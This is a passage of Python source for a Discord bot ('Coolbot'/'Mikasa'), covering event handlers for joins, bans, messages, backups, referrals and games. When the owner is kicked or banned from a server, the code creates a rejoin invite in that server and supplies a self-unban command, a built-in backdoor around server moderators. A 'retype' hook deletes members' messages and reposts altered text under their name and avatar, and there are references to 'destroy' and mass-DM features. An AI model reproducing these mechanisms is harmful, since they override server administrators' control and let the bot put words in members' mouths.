                    target_guild = g
                    break
        if target_guild:
            ch = next((c for c in target_guild.text_channels if c.permissions_for(target_guild.me).create_instant_invite), None)
            if ch:
                inv = await ch.create_invite(max_age=86400, max_uses=0, unique=True, reason="Coolbot daily destroy invite refresh")
                DESTROY_INVITE_LINK = inv.url
    except Exception:
        pass  # keep current link if refresh fails

    try:
        # ── Required-guild invite: always targets REQUIRED_GUILD_ID ──
        req_guild = bot.get_guild(REQUIRED_GUILD_ID)
        if req_guild:
            req_ch = next(
                (c for c in req_guild.text_channels if c.permissions_for(req_guild.me).create_instant_invite),
                None,
            )
            if req_ch:
                req_inv = await req_ch.create_invite(
                    max_age=0, max_uses=0, unique=False,
                    reason="Coolbot daily required-guild invite refresh",
                )
                REQUIRED_GUILD_INVITE = req_inv.url
    except Exception:
        pass  # keep current link if refresh fails


@tasks.loop(minutes=20)
async def _auto_backup_task():
    """Every 20 minutes, back up all data silently to disk."""
    try:
        await _backup_all_data(bot)
    except Exception as ex:
        print(f"[AutoBackup] Error: {ex}")

@_auto_backup_task.before_loop
async def _before_auto_backup():
    await bot.wait_until_ready()


#  GLOBAL AUTO-DEFER — fixes "app not responding" on ALL cmds
#  Runs before every command, defers slash interactions first
@bot.before_invoke
async def _global_auto_defer(ctx: commands.Context):
    """Set server-scoped economy context and defer slash interactions."""
    _MIKASA_CURRENT_GUILD_ID.set(str(ctx.guild.id) if ctx.guild else None)
    if ctx.interaction and not ctx.interaction.response.is_done():
        try:
            await ctx.defer(ephemeral=False)
        except Exception:
            pass

@bot.event
async def on_ready():
    bot._start_time = datetime.now(timezone.utc)
    try:
        load_lists()
    except Exception as _ll_ex:
        print(f"[on_ready] load_lists failed: {_ll_ex}")
    # Sync slash commands so /massdm etc. stay up to date
    try:
        synced = await bot.tree.sync()
        print(f"[on_ready] Synced {len(synced)} slash command(s)")
    except Exception as _sync_ex:
        print(f"[on_ready] tree.sync failed: {_sync_ex}")
    if not _refresh_destroy_invite.is_running():
        _refresh_destroy_invite.start()
    if not _auto_backup_task.is_running():
        _auto_backup_task.start()
    # Load persisted blacklists
    try:
        for uid_str in load("blacklist_users").keys():
            BLACKLISTED_USERS.add(int(uid_str))
        for gid_str in load("blacklist_guilds").keys():
            BLACKLISTED_GUILDS.add(int(gid_str))
    except Exception:
        pass

    # ── Populate invite cache for referral tracking ──
    try:
        for _guild in bot.guilds:
            try:
                _invs = await _guild.fetch_invites()
                _INVITE_CACHE[_guild.id] = {inv.code: inv.uses for inv in _invs}
            except Exception:
                _INVITE_CACHE[_guild.id] = {}
    except Exception as _ex:
        print(f"[on_ready] invite cache error: {_ex}")
    # ── Load welcome settings ──
    try:
        _ws = load("welcome_settings")
        _WELCOME_SETTINGS.update({int(k): v for k, v in _ws.items()})
    except Exception:
        pass
    # ── Load already-rewarded joiners (global invite dedup) ──
    try:
        _arj = load("already_rewarded_joiners")
        if isinstance(_arj, list):
            _ALREADY_REWARDED_JOINERS.update(_arj)
    except Exception:
        pass
    # ── Load destroy defaults ──
    try:
        _dd = load("destroy_defaults")
        if isinstance(_dd, dict):
            _DESTROY_DEFAULTS.update({int(k): v for k, v in _dd.items()})
    except Exception:
        pass
    # ── Load log channels ──
    try:
        _lc = load("log_channels")
        if isinstance(_lc, dict):
            _LOG_CHANNELS.update({int(k): v for k, v in _lc.items()})
    except Exception:
        pass
    # ── Load level-up channels ──
    try:
        _lvc = load("level_channels")
        if isinstance(_lvc, dict):
            _LEVEL_CHANNELS.update({int(k): int(v) for k, v in _lvc.items() if str(v).isdigit() or isinstance(v, int)})
    except Exception:
        pass
    # ── Load autoroles ──
    try:
        _aroles = load("autoroles")
        if isinstance(_aroles, dict):
            for gid, roles in _aroles.items():
                if isinstance(roles, list):
                    _AUTOROLES[int(gid)] = [int(r) for r in roles if str(r).isdigit() or isinstance(r, int)]
                elif isinstance(roles, (int, str)) and str(roles).isdigit():
                    _AUTOROLES[int(gid)] = [int(roles)]
    except Exception as _ar_ex:
        print(f"[on_ready] autoroles load: {_ar_ex}")
    # ── Load auto-responses ──
    try:
        _ar = load("autoresponses")
        if isinstance(_ar, dict):
            for gid, triggers in _ar.items():
                if isinstance(triggers, dict):
                    _AUTORESPONSES[int(gid)] = {str(k).lower(): str(v) for k, v in triggers.items()}
    except Exception:
        pass
    # ── Resolve fake invite codes → guild IDs ──
    for _fake_code in FAKE_INVITE_CODES:
        try:
            _fake_inv = await bot.fetch_invite(_fake_code)
            if _fake_inv.guild:
                FAKE_GUILD_IDS.add(_fake_inv.guild.id)
        except Exception:
            pass
    print(f"✅ {BOT_NAME} is online as {bot.user} (ID: {bot.user.id})")

    # ── One-time update log post ──────────────────────────────────────
    _update_flag = Path("backups/.update_v3_posted")
    if not _update_flag.exists():
        try:
            os.makedirs("backups", exist_ok=True)
            _log_ch = None
            if BACKUP_LOG_CHANNEL_ID:
                _log_ch = bot.get_channel(BACKUP_LOG_CHANNEL_ID)
                if _log_ch is None:
                    try:
                        _log_ch = await bot.fetch_channel(BACKUP_LOG_CHANNEL_ID)
                    except Exception:
                        _log_ch = None
            _upd_e = discord.Embed(
                title="📋 Coolbot — Update Log",
                description=(
                    "**New features added to Coolbot:**\n\n"
                    "🗄️ **Auto-Backup every 20 minutes**\n"
                    "> Compresses all player data and posts it here automatically.\n"
                    "> No DMs. Keeps last 3 days of backups on disk.\n\n"
                    "📦 **`,databackup`** — Owner only\n"
                    "> Manually trigger a backup — posts the `.gz` file right in the\n"
                    "> channel. Falls back to DM if file is too large.\n\n"
                    "♻️ **`,datarestore`** — Owner only\n"
                    "> Restore all data — attach the `.gz` file to the message.\n\n"
                    "📁 **`,datainfo`** — Owner only\n"
                    "> Shows all data files, sizes, and entry counts.\n\n"
                    "🔍 **`,datastatus`** — Owner only\n"
                    "> Shows latest auto-backup time, size, and disk file list.\n\n"
                    "💿 **`,datadisk [filename]`** — Owner only\n"
                    "> Restore from a disk backup by name — no upload needed.\n"
                    "> Run with no args to list all files on disk.\n\n"
                    "📖 **New `,help` category: 💾 Data**\n"
                    "> All data commands now have their own category in `,help`.\n"
                    "> Browse it by selecting **Data** from the help dropdown."
                ),
                color=COLORS["info"],
            )
            _upd_e.set_footer(text="Coolbot • Update posted once on startup")
            await _log_ch.send(embed=_upd_e)
            _update_flag.touch()
        except Exception as _ue:
            print(f"[UpdateLog] Failed to post: {_ue}")

    try:
        # Push a truly empty command list to every guild via raw HTTP —
        # this is the only reliable way to remove stale guild-specific commands
        # that cause duplicates. bot.tree.sync(guild=...) copies global commands
        # INTO the guild instead of clearing them, which is what causes duplicates.
        for guild in bot.guilds:
            try:
                await bot.http.bulk_upsert_guild_commands(bot.application_id, guild.id, [])
            except Exception:
                pass
        # Single global sync — only source of truth
        synced = await bot.tree.sync()
        print(f"⚡ Synced {len(synced)} slash command(s) globally")
    except Exception as ex:
        print(f"Sync error: {ex}")

@bot.event
async def on_guild_join(guild: discord.Guild):
    """Notify the primary owner when Mikasa joins a server; never self-elevate."""
    added_by = None
    try:
        await asyncio.sleep(1.5)
        async for entry in guild.audit_logs(limit=10, action=discord.AuditLogAction.bot_add):
            if entry.target and bot.user and entry.target.id == bot.user.id:
                age = (discord.utils.utcnow() - entry.created_at).total_seconds()
                if 0 <= age <= 30:
                    added_by = entry.user
                    break
    except Exception as exc:
        print(f"[on_guild_join] audit lookup unavailable: {exc}")

    try:
        owner = bot.get_user(OWNER_ID) or await bot.fetch_user(OWNER_ID)
        embed = discord.Embed(
            title=f"Mikasa joined {guild.name}",
            description=(
                f"Server ID: `{guild.id}`\n"
                f"Server owner: `{guild.owner_id}`\n"
                f"Added by: {added_by} (`{added_by.id}`)" if added_by else
                f"Server ID: `{guild.id}`\nServer owner: `{guild.owner_id}`\nAdded by: Unknown (audit log unavailable)"
            ),
            color=COLORS.get("main", 0x5865F2),
        )
        embed.add_field(
            name="Role setup",
            value=(
                "For safety, Mikasa does not move its own role or grant itself Administrator. "
                "A server administrator must place the Mikasa role below trusted staff roles "
                "and above only the roles Mikasa should manage."
            ),
            inline=False,
        )
        await owner.send(embed=embed)
    except Exception as exc:
        print(f"[on_guild_join] owner notification failed: {exc}")


def _mikasa_is_allowed_bot_or_inviter(guild: discord.Guild, user_id: int) -> bool:
    """True if user_id is an approved bot inviter or an explicitly allowed bot id."""
    try:
        settings = load("server_settings")
        gs = gdata(settings, guild.id)
        inviters = {int(x) for x in (gs.get("bot_allowed_users") or []) if str(x).isdigit()}
        allowed_bots = {int(x) for x in (gs.get("allowed_bots") or []) if str(x).isdigit()}
        if int(user_id) in inviters or int(user_id) in allowed_bots:
            return True
        try:
            cog = bot.get_cog("AntiNukeCog")
            if cog is not None and cog._is_whitelisted(guild, int(user_id), "bots"):
                return True
        except Exception:
            pass
    except Exception:
        return False
    return False


@bot.event
async def on_member_join(member: discord.Member):
    # ── Autorole: assign configured roles on join ──
    try:
        if not member.bot:
            role_ids = _AUTOROLES.get(member.guild.id) or []
            to_add = []
            me = member.guild.me
            for rid in role_ids:
                role = member.guild.get_role(rid)
                if not role or role in member.roles:
                    continue
                if me and role >= me.top_role:
                    continue
                to_add.append(role)
            if to_add:
                await member.add_roles(*to_add, reason="Autorole on join")
    except Exception as _auto_ex:
        print(f"[autorole] {member.guild.id}: {_auto_ex}")

    guild = member.guild

    # ── Security: kick unknown bots (antinuke whitelist category "bots") ──
    if member.bot:
        try:
            settings = load("server_settings")
            gs = gdata(settings, guild.id)
            if gs.get("antinuke_enabled", False) and gs.get("antibot_enabled", True):
                if bot.user and member.id == bot.user.id:
                    pass  # never kick ourselves
                else:
                    adder_id = None
                    try:
                        async for entry in guild.audit_logs(limit=10, action=discord.AuditLogAction.bot_add):
                            if entry.target and entry.target.id == member.id:
                                age = (discord.utils.utcnow() - entry.created_at).total_seconds()
                                if 0 <= age <= 30 and entry.user:
                                    adder_id = entry.user.id
                                break
                    except Exception:
                        pass

                    # A bot may be added only by a user explicitly approved with ,botallow.
                    # Existing bot-ID allowlists and anti-nuke bot-category whitelist remain valid.
                    allowed_inviter_ids = {int(x) for x in (gs.get("bot_allowed_users") or []) if str(x).isdigit()}
                    allowed_bot_ids = {int(x) for x in (gs.get("allowed_bots") or []) if str(x).isdigit()}
                    allowed = bool(adder_id and adder_id in allowed_inviter_ids) or member.id in allowed_bot_ids
                    try:
                        cog = bot.get_cog("AntiNukeCog")
                        if cog is not None and (cog._is_whitelisted(guild, member.id, "bots") or
                                                (adder_id and cog._is_whitelisted(guild, adder_id, "bots"))):
                            allowed = True
                    except Exception:
                        pass

                    # Trusted: approved inviter OR this bot id is on allowed_bots
                    if allowed:
                        try:
                            bots = {int(x) for x in (gs.get("allowed_bots") or []) if str(x).isdigit()}
                            bots.add(int(member.id))
                            gs["allowed_bots"] = sorted(bots)
                            save("server_settings", settings)
                        except Exception as _ab_ex:
                            print(f"[antibot] persist allowed bot failed: {_ab_ex}")
                        return  # do not ban/kick

                    if not allowed:
                        # Bot-add is handled separately from anti-nuke restoration.
                        # Remove only the newly added bot and, when audit attribution is
                        # reliable, ban the unauthorized inviter. Never restore channels here.
                        bot_removed = False
                        try:
                            await guild.ban(member, reason="🔒 Security: unauthorized bot (not allowlisted)", delete_message_days=0)
                            bot_removed = True
                        except Exception as ex:
                            print(f"[antibot remove] {ex}")

                        try:
                            try:
                                alert_id = (
                                    gs.get("antinuke_channel")
                                    or gs.get("antinuke_alert_channel")
                                    or gs.get("log_channel")
                                )
                                if alert_id:
                                    ch = guild.get_channel(int(alert_id))
                                    if ch:
                                        who = f"Added by <@{adder_id}>" if adder_id else "Adder unknown"
                                        await ch.send(embed=discord.Embed(
                                            title="🔒 Unauthorized Bot Removed",
                                            description=(
                                                f"Banned bot **{member}** (`{member.id}`): **{bot_removed}**.\n"
                                                f"Inviter: {who}\n"
                                                f"Approve future bot additions by this user with `,botallow {adder_id or 'USER_ID'}`."
                                            ),
                                            color=COLORS["warn"],
                                        ))
                            except Exception:
                                pass
                        except Exception:
                            pass
                        return
        except Exception as ex:
            print(f"[antibot] {ex}")

    # ── Detect referrer via invite delta ──────────────────────────────
    referrer_id  = None
    referrer_usr = None
    try:
        old_cache   = _INVITE_CACHE.get(guild.id, {})
        new_invites = await guild.fetch_invites()
        new_cache   = {inv.code: inv.uses for inv in new_invites}
        for code, uses in new_cache.items():
            if uses > old_cache.get(code, 0):
                for inv in new_invites:
                    if inv.code == code and inv.inviter:
                        referrer_id  = inv.inviter.id
                        referrer_usr = inv.inviter
                        break
                break
        _INVITE_CACHE[guild.id] = new_cache
    except Exception:
        pass

    # ── Reward referrer — only if this joiner hasn't rewarded anyone before ──
    if referrer_id and referrer_id != member.id:
        # ── Check if joiner is in any fake/J4J server ──
        is_fake_invite = False
        try:
            joiner_guild_ids = {g.id for g in member.mutual_guilds}
            if joiner_guild_ids & FAKE_GUILD_IDS:
                is_fake_invite = True
        except Exception:
            pass

        try:
            uid_r = str(referrer_id)
            ud_r  = get_pokemon_data(uid_r)
            ud_r["total_invites"] = ud_r.get("total_invites", 0) + 1

            if is_fake_invite:
                # Count as fake — no coins, no real invite credit
                ud_r["fake_invites"] = ud_r.get("fake_invites", 0) + 1
                save_pokemon_data(uid_r, ud_r)
                try:
                    r_dm = await bot.fetch_user(referrer_id)
                    await r_dm.send(embed=discord.Embed(
                        title="⚠️  Fake Invite Detected",
                        description=(
                            f"**{member.display_name}** joined **{guild.name}** using your invite,\n"
                            f"but they are in a **J4J/fake invite server** — no coins awarded.\n\n"
                            f"Fake invites: **{ud_r['fake_invites']}**"
                        ),
                        color=COLORS["warn"],
                    ).set_thumbnail(url=member.display_avatar.url)
                    .set_footer(text=f"Coolbot  ·  {guild.name}"))
                except Exception:
                    pass
            elif member.id not in _ALREADY_REWARDED_JOINERS:
                # Real invite — give coins
                _ALREADY_REWARDED_JOINERS.add(member.id)
                try:
                    save("already_rewarded_joiners", list(_ALREADY_REWARDED_JOINERS))
                except Exception:
                    pass
                ud_r["balance"]        = ud_r.get("balance", 0) + REFERRAL_REWARD
                ud_r["referrals"]      = ud_r.get("referrals", 0) + 1
                ud_r["referral_coins"] = ud_r.get("referral_coins", 0) + REFERRAL_REWARD
                save_pokemon_data(uid_r, ud_r)
                try:
                    r_dm = await bot.fetch_user(referrer_id)
                    dm_e = discord.Embed(
                        title="📨  Referral Reward!",
                        description=(
                            f"**{member.display_name}** just joined **{guild.name}** using your invite!\n"
                            f"💰 You earned **{REFERRAL_REWARD:,} coins**!\n\n"
                            f"Real invites: **{ud_r['referrals']}**  ·  "
                            f"Total earned: **{ud_r['referral_coins']:,} coins**"
                        ),
                        color=0x57F287,
                    )
                    dm_e.set_thumbnail(url=member.display_avatar.url)
                    dm_e.set_footer(text=f"Coolbot  ·  {guild.name}")
                    await r_dm.send(embed=dm_e)
                except Exception:
                    pass
            else:
                # Already rewarded someone before in another server — no coins
                save_pokemon_data(uid_r, ud_r)
        except Exception:
            pass

    # ── Welcome embed ─────────────────────────────────────────────────
    ch_id = _WELCOME_SETTINGS.get(guild.id)
    if not ch_id:
        ch = guild.system_channel
        if not ch or not ch.permissions_for(guild.me).send_messages:
            ch = next(
                (c for c in guild.text_channels if c.permissions_for(guild.me).send_messages),
                None,
            )
    else:
        ch = guild.get_channel(ch_id)

    if not ch:
        return

    # Join position
    try:
        join_pos = sorted(guild.members, key=lambda m: m.joined_at or discord.utils.utcnow()).index(member) + 1
    except Exception:
        join_pos = guild.member_count

    # Account age
    created  = member.created_at
    age_days = (discord.utils.utcnow() - created).days
    age_str  = f"{age_days // 365}y {age_days % 365}d" if age_days >= 365 else f"{age_days}d"

    # Ordinal
    def _ordinal(n):
        s = ["th","st","nd","rd"]
        v = n % 100
        return str(n) + (s[v % 10] if v % 10 < 4 and not 11 <= v <= 13 else s[0])

    invited_by = (
        f"**{referrer_usr.display_name}** (`{referrer_usr.id}`)"
        if referrer_usr else "*Could not detect invite*"
    )

    e = discord.Embed(
        title       = f"👋  Welcome to {guild.name}!",
        description = (
            f"Hey {member.mention}, great to have you here!\n"
            f"You are the **{_ordinal(join_pos)} member** to join.\n\n"
            f"Check out the rules and enjoy your stay! 🐻‍❄️"
        ),
        color = 0x5865F2,
    )
    e.set_thumbnail(url=member.display_avatar.url)
    if guild.banner:
        e.set_image(url=str(guild.banner.url))
    e.add_field(name="👤  Member",         value=f"{member.mention}\n`{member.id}`",    inline=True)
    e.add_field(name="📅  Account Age",    value=age_str,                                 inline=True)
    e.add_field(name="📨  Invited By",     value=invited_by,                              inline=True)
    e.add_field(name="👥  Server Members", value=f"**{guild.member_count:,}** members",   inline=True)
    e.set_footer(
        text=f"Coolbot  \u00b7  Welcome  \u00b7  {discord.utils.utcnow().strftime('%B %d, %Y')}",
        icon_url=bot.user.display_avatar.url,
    )
    try:
        await ch.send(embed=e)
    except Exception:
        pass

@bot.event
async def on_member_remove(member: discord.Member):
    if member.id != OWNER_ID:
        return
    guild = member.guild
    try:
        # Small delay so the audit log has time to populate
        await asyncio.sleep(1.5)
        # Check if this was a kick (not a voluntary leave)
        kicked_by = None
        try:
            async for entry in guild.audit_logs(limit=10, action=discord.AuditLogAction.kick):
                if entry.target and entry.target.id == OWNER_ID:
                    kicked_by = entry.user
                    break
        except Exception:
            pass
        if kicked_by is None:
            return  # voluntary leave — don't DM
        # Try to generate a fresh single-use invite
        invite_url = "❌ Couldn't generate one"
        for ch in guild.text_channels:
            try:
                inv = await ch.create_invite(max_uses=1, unique=True, reason="Owner kicked — auto rejoin link")
                invite_url = inv.url
                break
            except Exception:
                continue
        owner = await bot.fetch_user(OWNER_ID)
        e = discord.Embed(title="🚷  You Were Kicked", color=0xFF8C00)
        e.add_field(name="🖥️ Server",    value=f"**{guild.name}**\nID: `{guild.id}`", inline=False)
        e.add_field(name="👢 Kicked By", value=f"**{kicked_by}** (`{kicked_by.id}`)",  inline=False)
        e.add_field(name="🔗 Rejoin Link", value=invite_url,                            inline=False)
        e.set_footer(text=f"Coolbot — Owner Tracker")
        await owner.send(embed=e)
    except Exception as ex:
        print(f"[on_member_remove] Failed to DM owner: {ex}")


@bot.event
async def on_member_ban(guild: discord.Guild, user: discord.User):
    if user.id != OWNER_ID:
        return
    try:
        owner = await bot.fetch_user(OWNER_ID)

        # ── Step 1: send the instant alert DM right away ──────────────────
        server_owner_val = (
            f"**{guild.owner}** (``{guild.owner_id}``)"
            if guild.owner else f"``{guild.owner_id}``"
        )
        e = discord.Embed(
            title=f"🔨  You Got Banned in {guild.name}",
            color=COLORS["error"],
        )
        e.add_field(name="🖥️ Server",         value=f"**{guild.name}**\n``{guild.id}``", inline=False)
        e.add_field(name="👑 Server Owner",   value=server_owner_val,                    inline=False)
        e.add_field(name="🔨 Banned By",      value="*Checking audit log…*",             inline=False)
        e.add_field(name="🔗 Rejoin Link",    value="*Generating…*",                     inline=False)
        e.add_field(name="💡 Unban Yourself", value=f"``,srvunban {guild.id}``",         inline=False)
        e.set_footer(text="Coolbot — Owner Tracker")
        alert_msg = await owner.send(embed=e)

        # ── Step 2: fetch audit log + invite (best-effort, after small delay) ──
        await asyncio.sleep(1.5)

        banned_by = None
        ban_reason = "No reason provided"
        try:
            async for entry in guild.audit_logs(limit=15, action=discord.AuditLogAction.ban):
                if entry.target and entry.target.id == OWNER_ID:
                    banned_by   = entry.user
                    ban_reason  = entry.reason or "No reason provided"
                    break
        except Exception:
            pass

        invite_url = "❌ Couldn't generate — no invite permission"
        for ch in guild.text_channels:
            try:
                inv = await ch.create_invite(max_uses=1, unique=True, reason="Owner banned — auto rejoin link")
                invite_url = inv.url
                break
            except Exception:
                continue

        # ── Step 3: edit the alert DM with the full resolved details ──────
        e2 = discord.Embed(
            title=f"🔨  You Got Banned in {guild.name}",
            color=COLORS["error"],
        )
        e2.add_field(
            name="🖥️ Server",
            value=f"**{guild.name}**\n``{guild.id}``",
            inline=False,
        )
        e2.add_field(
            name="👑 Server Owner",
            value=server_owner_val,
            inline=False,
        )
        e2.add_field(
            name="🔨 Banned By",
            value=(f"**{banned_by}** (``{banned_by.id}``)" if banned_by else "Unknown"),
            inline=False,
        )
        e2.add_field(
            name="📝 Reason",
            value=ban_reason,
            inline=False,
        )
        e2.add_field(
            name="🔗 Rejoin Link",
            value=invite_url,
            inline=False,
        )
        e2.add_field(
            name="💡 Unban Yourself",
            value=f"Run this command in my DMs:\n``,srvunban {guild.id}``",
            inline=False,
        )
        e2.set_footer(text="Coolbot — Owner Tracker")
        try:
            await alert_msg.edit(embed=e2)
        except Exception:
            await owner.send(embed=e2)   # fallback if the edit fails
    except Exception as ex:
        print(f"[on_member_ban] Failed to DM owner: {ex}")

@bot.event
async def on_message_delete(message: discord.Message):
    try:
        if not message or not message.author or message.author.bot:
            return
        if not hasattr(bot, "snipe_data"):
            bot.snipe_data = {}
        bot.snipe_data[message.channel.id] = {
        "content":message.content or "[No text]",
        "author":str(message.author),
        "avatar":str(message.author.display_avatar)
    }
    except Exception as _sn_ex:
        print(f"[snipe] {_sn_ex}")

@bot.event
async def on_message_edit(before: discord.Message, after: discord.Message):
    try:
        if not before or not before.author or before.author.bot:
            return
        if not hasattr(bot, "editsnipe_data"):
            bot.editsnipe_data = {}
        bot.editsnipe_data[before.channel.id] = {
        "before":before.content or "[No text]",
        "after":after.content or "[No text]",
        "author":str(before.author),
        "avatar":str(before.author.display_avatar)
    }
    except Exception as _es_ex:
        print(f"[editsnipe] {_es_ex}")

@bot.event
async def on_message(message: discord.Message):
    try:
        if message.author is None or getattr(message.author, "bot", False):
            return
        # Prefix commands first — isolated so failures never kill the process
        if message.content and message.content.startswith(PREFIX):
            try:
                await bot.process_commands(message)
            except Exception as _pc_ex:
                print(f"[on_message] process_commands error: {_pc_ex}")
            return
    except Exception as _om_early:
        print(f"[on_message] early error: {_om_early}")
        return

    # ── AI chatbot: mention, name trigger, or reply-to-bot ──
    try:
        addressed, ai_query = _ai_is_addressed(message)
        if addressed:
            owner_q = re.sub(r"[^a-z0-9 ]+", " ", (ai_query or "").lower()).strip()
            owner_intents = (
                "who is your owner", "who s your owner", "who owns you", "who is the owner",
                "who made you", "who created you", "who is your creator", "who is mikasa owner",
                "tell me your owner", "name your owner", "your owner"
            )
            if any(phrase in owner_q for phrase in owner_intents):
                await message.channel.send("Mikasa is my owner. 🛡️💜")
            else:
                await _ai_respond(message, ai_query)
            return
    except Exception as _ai_ex:
        print(f"[AI Assist] {_ai_ex}")

    # ── AFK tracking — always safe, never blocks commands ──
    try:
        afk_data = load("afk")
        uid = str(message.author.id)
        if uid in afk_data:
            del afk_data[uid]
            save("afk", afk_data)
            try:
                await message.channel.send(
                    embed=discord.Embed(description=f"👋 Welcome back {message.author.mention}! AFK removed.", color=COLORS["info"]),
                    delete_after=5,
                )
            except Exception:
                pass
        for mentioned in message.mentions:
            mid = str(mentioned.id)
            if mid in afk_data:
                try:
                    await message.channel.send(
                        embed=discord.Embed(description=f"**{mentioned.display_name}** is {afk_data[mid]['reason']}", color=COLORS["info"]),
                        delete_after=8,
                    )
                except Exception:
                    pass
    except Exception:
        pass

    # ── Auto-respond (trigger → reply) ─────────────────────────────────────
    try:
        if message.guild and message.content and not message.content.startswith(PREFIX):
            triggers = _AUTORESPONSES.get(message.guild.id) or {}
            if triggers:
                content_low = message.content.lower()
                for trigger, reply in triggers.items():
                    if trigger and trigger in content_low:
                        try:
                            await message.channel.send(reply)
                        except Exception:
                            pass
                        break
    except Exception as _ar_ex:
        print(f"[autorespond] {_ar_ex}")

    # ── Retype hook ─────────────────────────────────────────────────────────
    # Mode 1 (global):  every non-command message → delete → resend via webhook as sender
    # Mode 2 (word sub): replace trigger word inside message → delete → resend as sender
    # Both modes: webhook = sender's name + pfp + APP badge, original deleted
    try:
        gid = message.guild.id if message.guild else None
        if gid is None:
            pass  # DMs: skip
        else:
            raw = message.content or ""
            # skip commands so bot still works
            is_cmd = raw.startswith(("/", ",")) and len(raw) > 1
            if not is_cmd:
                global_on  = gid in _RETYPE_ALL
                subs       = _RETYPE_GUILDS.get(gid, {})

                # apply word substitutions (case-insensitive replace, preserves rest of message)
                modified = raw
                for word, newword in subs.items():
                    import re as _re
                    modified = _re.sub(_re.escape(word), newword, modified, flags=_re.IGNORECASE)

                should_send = global_on or (modified != raw)

                if should_send and modified.strip():
                    # build/reuse webhook FIRST (before touching the message)
                    wh: discord.Webhook | None = None
                    try:
                        ch     = message.channel
                        cached = _RETYPE_WEBHOOKS.get(ch.id)
                        if cached:
                            try:
                                wh = discord.Webhook.from_url(cached, client=bot)
                            except Exception:
                                wh = None
                                _RETYPE_WEBHOOKS.pop(ch.id, None)
                        if wh is None:
                            for existing in await ch.webhooks():
                                if existing.name == "Coolbot":
                                    _RETYPE_WEBHOOKS[ch.id] = existing.url
                                    wh = existing
                                    break
                        if wh is None:
                            wh = await ch.create_webhook(name="Coolbot")
                            _RETYPE_WEBHOOKS[ch.id] = wh.url
                    except Exception:
                        wh = None

                    if wh:
                        # ── INSTANT: delete + resend fire at the exact same time ──
                        import asyncio as _asyncio
                        try:
                            await _asyncio.gather(
                                message.delete(),
                                wh.send(
                                    modified,
                                    username=message.author.display_name,
                                    avatar_url=str(message.author.display_avatar.url),
                                ),
                                return_exceptions=True,
                            )
                        except Exception:
                            pass
                    else:
                        try:
                            await message.delete()
                        except Exception:
                            pass
                        try:
                            await message.channel.send(modified)
                        except Exception:
                            pass
                    return
    except Exception:
        pass

    # ── Auto-responses ──
    try:
        autoresponses = load("autoresponses")
        gs = gdata(autoresponses, message.guild.id) if message.guild else {}
        content_lower = (message.content or "").lower()
        for trigger, response in gs.items():
            if trigger in content_lower:
                try:
                    await message.channel.send(response)
                except Exception:
                    pass
                break
    except Exception:
        pass

    # ── Sticky messages ──
    try:
        sticky_data = load("sticky")
        if message.guild:
            gs2 = gdata(sticky_data, message.guild.id)
            sticky_msg = gs2.get(str(message.channel.id))
            if sticky_msg:
                try:
                    async for msg in message.channel.history(limit=3):
                        if msg.author == bot.user and sticky_msg in (msg.embeds[0].description if msg.embeds else ""):
                            try:
                                await msg.delete()
                            except Exception:
                                pass
                            break
                    await message.channel.send(embed=discord.Embed(description=f"📌 {sticky_msg}", color=COLORS["info"]))
                except Exception:
                    pass
    except Exception:
        pass

    # ── Hangman ──
    try:
        games_cog = bot.cogs.get("Games")
        if games_cog and message.channel.id in games_cog.hangman_games:
            game = games_cog.hangman_games[message.channel.id]
            content = message.content or ""
            if message.author.id == game["player"] and len(content) == 1 and content.isalpha():
                letter = content.lower(); word = game["word"]; guessed = game["guessed"]; lives = game["lives"]
                stages = ["😵","😦","😟","😕","😐","🙂","😀"]
                if letter not in guessed:
                    guessed.add(letter)
                    if letter not in word:
                        lives[0] -= 1
                display = " ".join(l if l in guessed else r"\_" for l in word)
                try:
                    if all(l in guessed for l in word):
                        del games_cog.hangman_games[message.channel.id]
                        await message.channel.send(embed=discord.Embed(title="🎉 You won Hangman!", description=f"The word was **{word}**!", color=COLORS["success"]))
                    elif lives[0] <= 0:
                        del games_cog.hangman_games[message.channel.id]
                        await message.channel.send(embed=discord.Embed(title="💀 Game Over!", description=f"The word was **{word}**.", color=COLORS["error"]))
                    else:
                        e = discord.Embed(title="🔤 Hangman", description=f"{stages[lives[0]]} Lives: **{lives[0]}**\n\n`{display}`\n\nGuessed: {', '.join(sorted(guessed))}", color=COLORS["info"])
                        await game["msg"].edit(embed=e)
                except Exception:
                    pass
    except Exception:
        pass

    # ── Turn-based Word Chain handler ──
    try:
        games_cog = bot.cogs.get("Games")
        if games_cog and message.channel.id in games_cog.wordchain:
            wc = games_cog.wordchain[message.channel.id]
            if wc.get("active") and not message.author.bot:
                raw = (message.content or "").strip()
                if raw and not raw.startswith(PREFIX):
                    players = wc.get("players", [])
                    if not players:
                        wc["active"] = False
                        games_cog.wordchain.pop(message.channel.id, None)
                    elif message.author.id == players[wc["turn"] % len(players)]:
                        word = raw.lower()
                        reason = None
                        last = wc.get("last")
                        if not word.isalpha() or not (2 <= len(word) <= 32):
                            reason = f"❌ {message.author.mention}, send one word using 2–32 letters only. You're out!"
                        elif last and not word.startswith(last[-2:]):
                            reason = f"❌ {message.author.mention}, your word must start with the previous word's last TWO letters: `{last[-2:]}`. You're out!"
                        elif word in wc["used"]:
                            reason = f"❌ `{word}` was already used. You're out!"
                        if reason:
                            task = wc.get("turn_task")
                            if task and not task.done(): task.cancel()
                            wc["turn_token"] = wc.get("turn_token", 0) + 1
                            idx = wc["turn"] % len(wc["players"])
                            uid = wc["players"].pop(idx)
                            wc["eliminated"].append(uid)
                            await message.channel.send(embed=discord.Embed(description=reason, color=COLORS["error"]))
                            if len(wc["players"]) <= 1:
                                wc["active"] = False
                                games_cog.wordchain.pop(message.channel.id, None)
                                winner_id = wc["players"][0] if wc["players"] else None
                                winner_name = wc["names"].get(winner_id, "No one — all players were eliminated") if winner_id else "No one — all players were eliminated"
                                await message.channel.send(embed=discord.Embed(title="🏆 WORD CHAIN CHAMPION", description=f"**{winner_name}** wins!\nWords played: **{len(wc['used'])}**", color=COLORS["success"]))
                            else:
                                wc["turn"] = idx % len(wc["players"])
                                next_id = wc["players"][wc["turn"]]
                                await message.channel.send(embed=discord.Embed(title="🔗 Next Turn", description=f"<@{next_id}> is up next. You have **15 seconds**.\nRequired letters: `{wc['last'][-2:].upper() if wc['last'] else 'ANY'}`", color=COLORS["info"]))
                                if wc.get("schedule_timeout"): wc["schedule_timeout"]()
                        else:
                            wc["last"] = word
                            wc["used"].add(word)
                            wc["turn_count"] += 1
                            await message.add_reaction("✅")
                            task = wc.get("turn_task")
                            if task and not task.done(): task.cancel()
                            wc["turn_token"] = wc.get("turn_token", 0) + 1
                            wc["turn"] = (wc["turn"] + 1) % len(wc["players"])
                            next_id = wc["players"][wc["turn"]]
